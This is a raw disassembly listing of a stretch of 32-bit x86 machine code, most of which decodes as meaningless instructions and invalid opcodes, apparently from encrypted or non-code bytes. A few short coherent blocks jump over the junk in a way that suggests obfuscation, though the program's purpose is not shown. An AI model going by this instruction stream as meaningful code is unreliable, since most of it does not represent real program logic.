  412a03:	pop    ebp
  412a04:	cli    
  412a05:	aam    0xf4
  412a07:	sub    eax,0x6fb7a7aa
  412a0c:	cdq    
  412a0d:	pop    ecx
  412a0e:	int    0x26
  412a10:	add    eax,0x438bac74
  412a15:	cmp    al,0x83
  412a17:	push   0x53
  412a19:	mov    ebx,0xcfc592c7
  412a1e:	inc    edx
  412a1f:	mov    bh,0x5f
  412a21:	xchg   esi,eax
  412a22:	sbb    al,cl
  412a24:	out    dx,al
  412a25:	clc    
  412a26:	xchg   BYTE PTR [edx+0x74],cl
  412a29:	fcom   st(2)
  412a2b:	xor    eax,0x56d1457c
  412a30:	pop    DWORD PTR [edi+0x6f485239]
  412a36:	add    eax,0x22b3a7d5
  412a3b:	push   ss
  412a3c:	dec    esp
  412a3d:	xchg   esp,eax
  412a3e:	and    BYTE PTR [eax-0x3a],dh
  412a41:	(bad)  
  412a43:	les    ecx,FWORD PTR [ecx+0x13]
  412a46:	jge    0x412a0a
  412a48:	popa   
  412a49:	test   BYTE PTR [ebx],0x1
  412a4c:	push   eax
  412a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a4e:	or     BYTE PTR [ecx-0xf607496],0x4c
  412a55:	shl    dl,0x6f
  412a58:	popa   
  412a59:	inc    edx
  412a5a:	lds    ebx,FWORD PTR [ebx]
  412a5c:	xlat   BYTE PTR ds:[ebx]
  412a5d:	mov    es,WORD PTR [ecx-0x70137830]
  412a63:	pushf  
  412a64:	lea    eax,[ecx+0x43]
  412a67:	xchg   esp,eax
  412a68:	mov    bl,0xb3
  412a6a:	cli    
  412a6b:	loope  0x412a55
  412a6d:	ins    DWORD PTR es:[edi],dx
  412a6e:	ret    0xd987
  412a71:	(bad)  
  412a72:	mov    ch,0x90
  412a74:	cli    
  412a75:	xchg   esi,eax
  412a76:	pop    ds
  412a77:	mov    ch,0x2b
  412a79:	xchg   DWORD PTR [eax-0x37525bf0],edx
  412a7f:	loop   0x412a08
  412a81:	rol    edi,0x3f
  412a84:	xchg   edi,eax
  412a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a86:	cmp    ah,al
  412a88:	xchg   esp,eax
  412a89:	or     DWORD PTR [ecx+0x66],ecx
  412a8c:	sbb    eax,0x4a31341b
  412a91:	inc    edi
  412a92:	shl    BYTE PTR [edi+ebp*4-0x59],0x54
  412a97:	pop    edi
  412a98:	jns    0x412a61
  412a9a:	cmp    DWORD PTR [eax],esi
  412a9c:	in     eax,0x98
  412a9e:	(bad)  
  412a9f:	mov    esi,0x3e694b8d
  412aa4:	cli    
  412aa5:	loop   0x412ab9
  412aa7:	mov    esp,0x435782c0
  412aac:	xor    ch,dl
  412aae:	pop    si
  412ab0:	or     DWORD PTR ds:0x73ddc7cb,0xffffffb5
  412ab7:	xor    eax,0xf32492d8
  412abc:	push   esi
  412abd:	sub    edx,DWORD PTR ds:0x93e9cbe6
  412ac3:	fidivr WORD PTR [ebx]
  412ac5:	out    dx,eax
  412ac6:	std    
  412ac7:	add    eax,0x9fa57111
  412acc:	mov    dh,BYTE PTR [ecx-0x2f3abcf]
  412ad2:	sbb    BYTE PTR [ebx+0x66c4ca98],cl
  412ad8:	adc    dh,al
  412ada:	xchg   esi,eax
  412adb:	and    eax,0xad4726f
  412ae0:	cmp    edx,DWORD PTR [ebx+0x342edeb4]
  412ae6:	or     DWORD PTR [ecx+0xde7d763],edx
  412aec:	adc    eax,0xf25c4eea
  412af1:	xchg   DWORD PTR [ecx-0x2630c0ac],esp
  412af7:	sbb    ebx,DWORD PTR [ebx+0x7470c5c5]
  412afd:	inc    edi
  412afe:	or     bl,dl
  412b00:	fisttp WORD PTR [edi+0x50a554fb]
  412b06:	sahf   
  412b07:	int    0x5a
  412b09:	sbb    edi,0xc4610f8d
  412b0f:	fld    DWORD PTR [ecx+esi*2]
  412b12:	test   eax,0x41e1a1be
  412b17:	inc    ecx
  412b18:	jne    0x412b34
  412b1a:	mov    DWORD PTR [ecx-0x245c7c1e],ecx
  412b20:	mov    al,ds:0x69797c69
  412b25:	jle    0x412b98
  412b27:	int    0x67
  412b29:	outs   dx,DWORD PTR ds:[esi]
  412b2a:	test   al,0xd9
  412b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b2d:	popa   
  412b2e:	and    eax,0xaac27521
  412b33:	enter  0x3526,0x22
  412b37:	retf   
  412b38:	(bad)  
  412b3a:	adc    esp,DWORD PTR [eax-0x45054a02]
  412b40:	cli    
  412b41:	in     al,0xed
  412b43:	push   ebx
  412b44:	sbb    BYTE PTR [edi],cl
  412b46:	and    al,0x5f
  412b48:	fcmovnu st,st(5)
  412b4a:	aam    0xbc
  412b4c:	push   ebp
  412b4d:	inc    ebp
  412b4e:	dec    ebp
  412b4f:	jo     0x412b32
  412b51:	std    
  412b52:	jle    0x412bcd
  412b54:	and    esi,DWORD PTR [edx]
  412b56:	push   esi
  412b57:	pop    esi
  412b58:	aaa    
  412b59:	(bad)  
  412b5a:	cmp    dh,ah
  412b5c:	push   esp
  412b5d:	mov    cl,dh
  412b5f:	add    al,BYTE PTR [eax]
  412b61:	jnp    0x412ae4
  412b63:	sub    eax,0x8641af98
  412b68:	fsub   st,st(2)
  412b6a:	or     al,0xd6
  412b6c:	test   al,0xb7
  412b6e:	dec    ebp
  412b6f:	or     eax,0xb718dec7
  412b74:	ds mov edi,0xe360d12a
  412b7a:	mov    gs,WORD PTR [edi-0x35]
  412b7d:	add    esi,0x68
  412b80:	out    0xb2,eax
  412b82:	xchg   ebx,eax
  412b83:	std    
  412b84:	xchg   edi,eax
  412b85:	test   BYTE PTR ds:0x3d1f5309,0x99
  412b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b8d:	cmp    eax,0xca0fd14a
  412b92:	sub    edi,ecx
  412b94:	ret    
  412b95:	cwde   
  412b96:	lods   al,BYTE PTR ds:[esi]
  412b97:	lods   al,BYTE PTR ds:[esi]
  412b98:	nop
  412b99:	scas   al,BYTE PTR es:[edi]
  412b9a:	dec    edi
  412b9b:	sbb    ebp,DWORD PTR ds:[ecx]
  412b9e:	neg    DWORD PTR fs:[edx+edi*2-0x1d166958]
  412ba6:	repz jnp 0x412be4
  412ba9:	mov    DWORD PTR [ebx],esp
  412bab:	mov    ah,0x83
  412bad:	xor    eax,0x680330e2
  412bb2:	sbb    BYTE PTR [ecx+ebx*8+0x26],0x35
  412bb7:	cmp    eax,0x645a09d1
  412bbc:	xor    ecx,DWORD PTR [esi+edx*8]
  412bbf:	les    edx,FWORD PTR [esi]
  412bc1:	leave  
  412bc2:	add    ebx,edi
  412bc4:	out    dx,eax
  412bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc6:	mov    ah,0x55
  412bc8:	scas   al,BYTE PTR es:[edi]
  412bc9:	not    DWORD PTR [ecx+ecx*4-0x21]
  412bcd:	test   eax,0xee5ec861
  412bd2:	imul   ecx,eax,0x3f4f490e
  412bd8:	sahf   
  412bd9:	fucomip st,st(7)
  412bdb:	or     dh,BYTE PTR cs:[ecx]
  412bde:	dec    ebp
  412bdf:	sti    
  412be0:	fcmovbe st,st(5)
  412be2:	push   es
  412be3:	cdq    
  412be4:	xchg   ecx,eax
  412be5:	pop    esi
  412be6:	inc    ebp
  412be7:	call   0x82e5e57e
  412bec:	sbb    BYTE PTR [edx],0xa6
  412bef:	and    eax,0xe4742e85
  412bf4:	adc    dh,BYTE PTR [edx-0x16]
  412bf7:	pusha  
  412bf8:	xor    eax,DWORD PTR [esi]
  412bfa:	add    eax,0xe632bb28
  412bff:	cmp    dl,bl
  412c01:	dec    eax
  412c02:	lahf   
  412c03:	push   ss
  412c04:	sub    edi,0x4b903df6
  412c0a:	imul   edx,DWORD PTR [esp+eiz*4+0x332ebd75],0x7d
  412c12:	shl    DWORD PTR [ebp+0x3055918],1
  412c18:	dec    ebx
  412c1a:	sub    edx,ebp
  412c1c:	pop    ebx
  412c1d:	gs inc ecx
  412c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c20:	pop    eax
  412c21:	inc    edx
  412c22:	pop    ecx
  412c23:	xchg   esi,eax
  412c24:	sub    esi,DWORD PTR [edi-0x59]
  412c27:	dec    esp
  412c28:	inc    ebp
  412c29:	cmp    cl,BYTE PTR [edx+0x48]
  412c2c:	sub    ebp,DWORD PTR [eax+edi*2]
  412c2f:	lahf   
  412c30:	data16 mov ah,0xda
  412c33:	outs   dx,BYTE PTR ds:[esi]
  412c34:	sbb    ebp,esi
  412c36:	pusha  
  412c37:	iret   
  412c38:	lods   eax,DWORD PTR ds:[esi]
  412c39:	into   
  412c3a:	rcr    ch,0x2d
  412c3d:	or     ecx,DWORD PTR [ebx+0x6c528a88]
  412c43:	fld    TBYTE PTR [edi-0x1e]
  412c46:	inc    edx
  412c47:	sbb    ch,BYTE PTR [ecx]
  412c49:	retf   0x5cc3
  412c4c:	and    ah,dl
  412c4e:	pop    ss
  412c4f:	retf   
  412c50:	sti    
  412c51:	mov    BYTE PTR [ebx-0x6d],0x1b
  412c55:	mov    WORD PTR [edx+0x66e724d9],cs
  412c5b:	pusha  
  412c5c:	cld    
  412c5d:	(bad)  
  412c5e:	in     al,dx
  412c5f:	stc    
  412c60:	add    eax,0x4c8312af
  412c65:	rol    edi,1
  412c67:	(bad)  
  412c68:	fdivr  DWORD PTR [eax-0x4a]
  412c6b:	ret    
  412c6c:	jae    0x412bf9
  412c6e:	inc    ebp
  412c6f:	clc    
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xb0815d0c
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [eax-0x3d054b4],dh
  412cb2:	add    ch,al
  412cb4:	jnp    0x412c80
  412cb6:	fdiv   QWORD PTR [eax]
  412cb8:	or     DWORD PTR [ebx+ebx*4-0x2c8091b3],esi
  412cbf:	daa    
  412cc0:	scas   al,BYTE PTR es:[edi]
  412cc1:	arpl   WORD PTR [edi-0x267f9575],si
  412cc7:	sub    al,0x45
  412cc9:	cld    
  412cca:	jb     0x412c98
  412ccc:	fs pop ebx
  412cce:	(bad)  
  412ccf:	loop   0x412ccb
  412cd1:	addr16 (bad) 
  412cd3:	and    al,0x26
  412cd5:	pop    ebp
  412cd6:	(bad)  
  412cd7:	cli    
  412cd8:	inc    esi
  412cd9:	popa   
  412cda:	cwde   
  412cdb:	(bad)  
  412cdc:	jl     0x412d3f
  412cde:	icebp  
  412cdf:	cs mov ah,0xbf
  412ce2:	xor    cl,BYTE PTR [ecx-0x3cb2b20f]
  412ce8:	pop    ebp
  412ce9:	aad    0x91
  412ceb:	int3   
  412cec:	scas   eax,DWORD PTR es:[edi]
  412ced:	in     al,dx
  412cee:	cmp    eax,DWORD PTR [eax-0x4e]
  412cf1:	dec    edx
  412cf2:	sbb    DWORD PTR [eax],ebx
  412cf4:	pop    ds
  412cf5:	push   0xffffff9f
  412cf7:	inc    esi
  412cf8:	jmp    0xb9b932f2
  412cfd:	push   edi
  412cfe:	clc    
  412cff:	jp     0x412d40
  412d01:	mov    dh,0xfb
  412d03:	outs   dx,BYTE PTR ds:[esi]
  412d04:	test   DWORD PTR [esi],ebp
  412d06:	cld    
  412d07:	jne    0x412ca7
  412d09:	push   0xfffffff3
  412d0b:	sti    
  412d0c:	mov    ebx,0xae69e0d5
  412d11:	add    BYTE PTR [ebp-0x6b],dl
  412d14:	pop    eax
  412d15:	das    
  412d16:	and    al,0xb1
  412d18:	cmp    eax,0xebbbf18f
  412d1d:	pop    ss
  412d1e:	sar    cl,0x8e
  412d21:	xlat   BYTE PTR ss:[ebx]
  412d23:	sub    bh,BYTE PTR [eax+ecx*8-0x7a]
  412d27:	sti    
  412d28:	aam    0x99
  412d2a:	cli    
  412d2b:	mov    esp,esp
  412d2d:	(bad)  
  412d2e:	fbstp  TBYTE PTR [ebp-0x1a]
  412d31:	mov    dh,0x95
  412d33:	jle    0x412d35
  412d35:	das    
  412d36:	mov    cl,0x99
  412d38:	fadd   QWORD PTR [ebp+0x6b]
  412d3b:	test   eax,0xc553a197
  412d40:	nop
  412d41:	dec    ebx
  412d42:	lea    esp,ds:0x7273da02
  412d48:	mov    BYTE PTR [eax+0x0],0xee
  412d4c:	or     ch,BYTE PTR [edi-0x766d2140]
  412d52:	adc    cl,BYTE PTR [edx+0x6e]
  412d55:	mov    eax,ds:0xde365d12
  412d5a:	scas   eax,DWORD PTR es:[edi]
  412d5b:	add    eax,0x9d8a73eb
  412d60:	mov    dh,0x33
  412d62:	bound  ebp,QWORD PTR [ebx-0x44ce62f0]
  412d68:	ja     0x412d32
  412d6a:	clc    
  412d6b:	push   eax
  412d6c:	jecxz  0x412db0
  412d6e:	inc    esi
  412d6f:	add    eax,0x7b
  412d72:	xor    al,0xf6
  412d74:	or     DWORD PTR [ebx],ecx
  412d76:	cmp    al,0xc0
  412d78:	pushf  
  412d79:	inc    edi
  412d7a:	rol    DWORD PTR [ebx-0x53],0x3c
  412d7e:	sti    
  412d7f:	pop    edx
  412d80:	mov    esp,0xabcac61f
  412d85:	imul   ebp,DWORD PTR [edx-0x59173ff7],0xffffffc6
  412d8c:	cwde   
  412d8d:	dec    ecx
  412d8e:	xchg   ecx,eax
  412d8f:	out    dx,eax
  412d90:	stc    
  412d91:	or     esp,DWORD PTR [eax+0x146ec930]
  412d97:	inc    esp
  412d98:	push   ss
  412d99:	add    BYTE PTR [eax-0x52b6f10b],al
  412d9f:	rcl    DWORD PTR [esi],0xdb
  412da2:	(bad)  
  412da3:	(bad)  
  412da4:	xchg   edx,eax
  412da5:	nop
  412da6:	dec    edx
  412da7:	xchg   ebp,eax
  412da8:	xor    eax,edx
  412daa:	sub    al,0xee
  412dac:	sbb    eax,0x16c94cb9
  412db1:	pop    eax
  412db2:	mov    edi,0x9719a67e
  412db7:	or     eax,0x20393a56
  412dbc:	pop    ds
  412dbd:	in     al,dx
  412dbe:	loop   0x412e23
  412dc0:	mov    edi,0x53c25df0
  412dc5:	int3   
  412dc6:	cmp    eax,0x18133a7f
  412dcb:	arpl   WORD PTR [ecx+eax*8-0x74],dx
  412dcf:	mov    ebp,0x2cb9eef9
  412dd4:	aaa    
  412dd5:	mov    edx,0xb1015336
  412dda:	push   es
  412ddb:	adc    ah,BYTE PTR [ebx]
  412ddd:	cmp    DWORD PTR [ebx],edx
  412ddf:	rcl    DWORD PTR [eax-0x39],cl
  412de2:	sahf   
  412de3:	retf   
  412de4:	xchg   DWORD PTR [edx],edx
  412de6:	xor    esp,edi
  412de8:	mov    cs,WORD PTR [ecx+0x4c]
  412deb:	ds sub esi,ebx
  412dee:	ret    
  412def:	sub    ch,bl
  412df1:	push   es
  412df2:	cmp    BYTE PTR [ecx+0x31],dl
  412df5:	inc    ecx
  412df6:	mov    bh,0x71
  412df8:	jno    0x412e1a
  412dfa:	xor    al,0x80
  412dfc:	aaa    
  412dfd:	sbb    edi,DWORD PTR [ebp-0x50]
  412e00:	ins    BYTE PTR es:[edi],dx
  412e01:	jae    0x412e81
  412e03:	out    0x62,al
  412e05:	and    al,0xeb
  412e07:	call   DWORD PTR [ebx-0x7704403]
  412e0d:	ficom  WORD PTR [ebx]
  412e0f:	hlt    
  412e10:	retf   0xd002
  412e13:	enter  0xfb10,0xed
  412e17:	or     al,BYTE PTR [esi]
  412e19:	popf   
  412e1a:	fist   DWORD PTR [esi]
  412e1c:	out    0xf8,eax
  412e1e:	xor    al,0x40
  412e20:	pop    ecx
  412e21:	icebp  
  412e22:	push   ss
  412e23:	push   cs
  412e24:	mov    dh,0xd1
  412e26:	xor    eax,edi
  412e28:	and    eax,0x570deea9
  412e2d:	retf   0x562c
  412e30:	(bad)  
  412e31:	and    eax,edi
  412e33:	jmp    eax
  412e35:	shl    BYTE PTR [edi],cl
  412e37:	fidivr WORD PTR [esi+0x15]
  412e3a:	push   ss
  412e3b:	ja     0x412e15
  412e3d:	dec    ebp
  412e3e:	test   ebp,edi
  412e40:	(bad)  
  412e44:	push   eax
  412e45:	pop    DWORD PTR [esi+0x4f]
  412e48:	mov    edx,0x5cda07e6
  412e4d:	scas   eax,DWORD PTR es:[edi]
  412e4e:	pop    ebp
  412e4f:	fnstcw WORD PTR [ebp+edx*1+0x1d80c9a6]
  412e56:	add    eax,0xbbe8b21a
  412e5b:	push   ss
  412e5c:	fsubrp st(6),st
  412e5e:	xor    ch,BYTE PTR [ecx+0x1a]
  412e61:	cdq    
  412e62:	(bad)  
  412e64:	inc    eax
  412e65:	xor    BYTE PTR [esi+edx*1-0x13],ah
  412e69:	and    BYTE PTR [ebp+0x346971f6],0xee
  412e70:	push   0xffffffb4
  412e72:	pop    ss
  412e73:	aaa    
  412e74:	out    dx,eax
  412e75:	cwde   
  412e76:	loope  0x412e4f
  412e78:	xlat   BYTE PTR ds:[ebx]
  412e79:	inc    eax
  412e7a:	jne    0x412e63
  412e7c:	ins    DWORD PTR es:[edi],dx
  412e7d:	ret    0xa1a6
  412e80:	add    eax,0x2443fa03
  412e85:	cmp    al,0x40
  412e87:	ins    DWORD PTR es:[edi],dx
  412e88:	lock sub bh,BYTE PTR es:[ebp-0x20]
  412e8d:	and    bh,BYTE PTR [edi+0x57]
  412e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e91:	sub    bl,BYTE PTR [ecx]
  412e93:	sbb    eax,0x4ce8e084
  412e98:	dec    esp
  412e99:	add    DWORD PTR fs:[ebp+0x29394ef5],esi
  412ea0:	lds    esp,FWORD PTR [ecx+0x6cfc260a]
  412ea6:	push   ds
  412ea7:	push   edi
  412ea8:	and    ebp,eax
  412eaa:	and    ebx,DWORD PTR [ebp+0x509156fc]
  412eb0:	(bad)  
  412eb1:	dec    esp
  412eb2:	mov    dh,0x81
  412eb4:	mov    gs,WORD PTR [edi]
  412eb6:	pop    edx
  412eb7:	jae    0x412e95
  412eb9:	test   DWORD PTR [ebx-0x30],ebx
  412ebc:	ins    DWORD PTR es:[edi],dx
  412ebd:	cmp    edi,DWORD PTR [edi-0xa]
  412ec0:	adc    edx,esi
  412ec2:	mov    al,ds:0x56524310
  412ec7:	adc    DWORD PTR [ebx+0xb],edx
  412eca:	push   ebp
  412ecb:	daa    
  412ecc:	mov    ah,0xc1
  412ece:	pushf  
  412ecf:	pop    eax
  412ed0:	inc    esi
  412ed1:	sbb    al,al
  412ed3:	xchg   edx,eax
  412ed4:	call   0x9e77:0x3e962b1f
  412edb:	call   0x796da8b6
  412ee0:	in     al,dx
  412ee1:	sub    ebx,DWORD PTR [edx+0x7758039c]
  412ee7:	(bad)  
  412ee8:	fcomp  DWORD PTR [ebp-0x53]
  412eeb:	sub    DWORD PTR [ecx-0x22],ecx
  412eee:	ds loope 0x412ed5
  412ef1:	dec    ebp
  412ef2:	push   eax
  412ef3:	sbb    BYTE PTR [edi-0x49],al
  412ef6:	fwait
  412ef7:	shl    DWORD PTR [ebp-0x6b],1
  412efa:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  412efd:	outs   dx,DWORD PTR ds:[esi]
  412efe:	test   al,0x23
  412f00:	cli    
  412f01:	retf   
  412f02:	imul   esi,esp,0xffffff8b
  412f05:	dec    edi
  412f06:	mov    edx,0xa820ebb9
  412f0b:	iret   
  412f0c:	fld    TBYTE PTR [ebx]
  412f0e:	adc    ebp,ebx
  412f10:	inc    eax
  412f11:	jl     0x412f1b
  412f13:	sahf   
  412f14:	int    0x1a
  412f16:	push   esi
  412f17:	adc    cl,dl
  412f19:	stos   DWORD PTR es:[edi],eax
  412f1a:	or     BYTE PTR [edx+0x8],bl
  412f1d:	dec    ebx
  412f1e:	retf   
  412f1f:	or     DWORD PTR [esi],ecx
  412f21:	ror    DWORD PTR [ebx],0x42
  412f24:	jbe    0x412f3e
  412f26:	out    dx,al
  412f27:	je     0x412f59
  412f29:	push   ebp
  412f2a:	dec    esp
  412f2b:	adc    BYTE PTR [edx+eiz*8+0x278b4bd8],dl
  412f32:	inc    eax
  412f33:	and    BYTE PTR [edi-0x7d],0xdb
  412f37:	xchg   esp,eax
  412f38:	jle    0x412ed7
  412f3a:	mul    dl
  412f3c:	or     bl,dl
  412f3e:	inc    esi
  412f3f:	test   eax,0x3b39076c
  412f44:	lods   eax,DWORD PTR ds:[esi]
  412f45:	mov    edx,0xfe9ecdea
  412f4a:	pop    ebx
  412f4b:	std    
  412f4c:	jecxz  0x412efe
  412f4e:	test   eax,0x4ad0f962
  412f53:	pusha  
  412f54:	xchg   ebx,eax
  412f55:	aaa    
  412f56:	(bad)  
  412f57:	fimul  WORD PTR [edx+0x61]
  412f5a:	push   ecx
  412f5b:	lds    edx,FWORD PTR [ebx+0x42]
  412f5e:	cwde   
  412f5f:	leave  
  412f60:	hlt    
  412f61:	adc    al,0x6e
  412f63:	lock jp 0x412fe2
  412f66:	mov    ds:0xe471e2cc,eax
  412f6b:	xchg   ebx,eax
  412f6c:	clc    
  412f6d:	pop    esi
  412f6e:	fild   WORD PTR [eax]
  412f70:	jge    0x412f14
  412f72:	or     cl,BYTE PTR [edi+0x54]
  412f75:	retf   0x3872
  412f78:	inc    esp
  412f79:	mov    bl,0x1e
  412f7b:	inc    ecx
  412f7c:	adc    eax,DWORD PTR [edi]
  412f7e:	sbb    esp,DWORD PTR [edx]
  412f80:	lds    esi,FWORD PTR [esi+0x72]
  412f83:	out    0x60,al
  412f85:	sub    eax,0xc529d7b2
  412f8a:	mov    eax,0x80740299
  412f8f:	mov    bl,0x47
  412f91:	mov    ebp,0x5d103776
  412f96:	clc    
  412f97:	cld    
  412f98:	test   DWORD PTR [edi+0x6fcbf583],edx
  412f9e:	xor    BYTE PTR [edi+0x135b1784],0x94
  412fa5:	xor    ah,0x3c
  412fa8:	sub    cl,bh
  412faa:	sbb    eax,0xe878e939
  412faf:	add    esp,DWORD PTR [eax]
  412fb1:	nop
  412fb2:	lahf   
  412fb3:	sbb    al,0x48
  412fb5:	pop    es
  412fb6:	cmp    al,0xe9
  412fb8:	fistp  DWORD PTR [edi+0x40]
  412fbb:	setnp  BYTE PTR [ecx]
  412fbe:	fwait
  412fbf:	out    dx,eax
  412fc0:	adc    al,0x1e
  412fc2:	mov    edx,0x622efe65
  412fc7:	sbb    DWORD PTR [edi+0x18d92579],esp
  412fcd:	or     BYTE PTR fs:0x13c67c35,0xa9
  412fd5:	push   esi
  412fd6:	and    eax,0xe7e82120
  412fdb:	stos   DWORD PTR es:[edi],eax
  412fdc:	dec    esp
  412fdd:	or     DWORD PTR [ecx+eiz*1+0x287decc1],ebp
  412fe4:	or     edx,DWORD PTR [ebp-0x4fafbc3a]
  412fea:	(bad)  
  412feb:	ss xchg esi,eax
  412fed:	inc    eax
  412fee:	dec    eax
  412fef:	shl    BYTE PTR [edx+0x9],1
  412ff2:	shl    DWORD PTR [esi],0x61
  412ff5:	loopne 0x413060
  412ff7:	mov    ds:0x5d63a06,eax
  412ffc:	cwde   
  412ffd:	loop   0x41302a
  412fff:	out    0xec,eax
  413001:	call   0x10f0d203
  413006:	fadd   st,st(7)
  413008:	sub    al,cl
  41300a:	daa    
  41300b:	fs adc eax,0x69d39b38
  413011:	jl     0x412ff6
  413013:	div    DWORD PTR cs:[edi-0x8cbaecf]
  41301a:	jne    0x413079
  41301c:	bound  edi,QWORD PTR [ebp-0x62]
  41301f:	pop    ecx
  413020:	mov    esp,DWORD PTR [ebp+ebp*4-0x56]
  413024:	in     eax,0x60
  413026:	outs   dx,BYTE PTR ds:[esi]
  413027:	mov    ch,0xb6
  413029:	mov    eax,0x4b1b1bd8
  41302e:	dec    edi
  41302f:	jl     0x413099
  413031:	out    0x9e,eax
  413033:	pop    edi
  413034:	out    0x6,eax
  413036:	test   BYTE PTR [esi+0x4c],dl
  413039:	mov    al,ds:0x69cb7c30
  41303e:	punpcklwd mm6,DWORD PTR [eax]
  413041:	add    esi,DWORD PTR [ebx]
  413043:	popa   
  413044:	xlat   BYTE PTR ds:[ebx]
  413045:	add    DWORD PTR [esi],0xffffffb2
  413048:	enter  0x3a41,0x5f
  41304c:	fwait
  41304d:	pop    esp
  41304e:	pop    esp
  41304f:	cmp    eax,0xb00b2607
  413054:	jno    0x41305d
  413056:	daa    
  413057:	add    ch,bh
  413059:	fwait
  41305a:	loopne 0x4130ca
  41305c:	jno    0x413091
  41305e:	xchg   ebx,eax
  41305f:	ins    BYTE PTR es:[edi],dx
  413060:	fbstp  TBYTE PTR ds:0x622da8e9
  413066:	lahf   
  413067:	retf   
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x42206f
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [eax+eiz*8-0x2c],edi
  4130e0:	out    dx,al
  4130e1:	mov    esi,0x181848d3
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [eax-0x10],ah
  4130ec:	jns    0x4130e6
  4130ee:	out    0x8d,al
  4130f0:	aaa    
  4130f1:	dec    esi
  4130f2:	xchg   esp,eax
  4130f3:	xchg   ecx,eax
  4130f4:	pop    ebp
  4130f5:	jg     0x413096
  4130f7:	div    DWORD PTR [ebp+0x79]
  4130fa:	xchg   ebp,eax
  4130fb:	inc    esi
  4130fc:	mov    ecx,0x639e14b0
  413101:	jg     0x413163
  413103:	fdivr  DWORD PTR [ebx]
  413105:	xchg   ecx,eax
  413106:	cli    
  413107:	dec    edi
  413108:	jb     0x4130e8
  41310a:	xchg   ebx,ecx
  41310c:	and    BYTE PTR [esi-0x23e1093b],bh
  413112:	adc    al,cl
  413114:	cld    
  413115:	outs   dx,BYTE PTR ds:[esi]
  413116:	daa    
  413117:	cmp    DWORD PTR [esi+0x1b66658a],ebx
  41311d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311e:	scas   eax,DWORD PTR es:[edi]
  41311f:	inc    esp
  413120:	jg     0x413184
  413122:	mov    ebx,0xd406ace9
  413127:	mov    edx,0xdf993c01
  41312c:	dec    edx
  41312d:	push   esi
  41312e:	js     0x4130c0
  413130:	sbb    ebp,DWORD PTR [ebx-0x68]
  413133:	push   ecx
  413134:	test   DWORD PTR [ebp+0x37c5259d],ebp
  41313a:	popf   
  41313b:	dec    ebx
  41313c:	xchg   BYTE PTR [edx+0x2e29548a],dl
  413142:	push   ss
  413143:	fidivr DWORD PTR [ebx-0x7a]
  413146:	pop    esi
  413147:	int3   
  413148:	cmp    al,0xb1
  41314b:	mov    cl,BYTE PTR [ebx+0x3a132494]
  413151:	dec    esi
  413152:	inc    ecx
  413153:	mov    eax,0xf3f55f82
  413158:	pop    ss
  413159:	call   0x6b24:0xf82c3fd7
  413160:	jne    0x413103
  413162:	leave  
  413163:	sub    dl,BYTE PTR [ebx]
  413165:	mov    ah,0x3c
  413167:	sbb    eax,0xe28c4a97
  41316c:	cmp    ah,BYTE PTR [edx-0x63]
  41316f:	pushf  
  413170:	outs   dx,BYTE PTR ds:[esi]
  413171:	jge    0x4131a7
  413173:	add    eax,0x4ea1a022
  413178:	jmp    0x50095bf4
  41317d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41317e:	inc    edx
  41317f:	test   eax,0x3041c9e6
  413184:	ret    
  413185:	dec    esp
  413186:	xchg   edx,eax
  413187:	push   edi
  413188:	sbb    eax,0xf98a6411
  41318d:	in     eax,dx
  41318e:	xchg   esi,eax
  41318f:	push   ecx
  413190:	jecxz  0x413192
  413192:	(bad)  
  413193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413194:	xchg   edi,eax
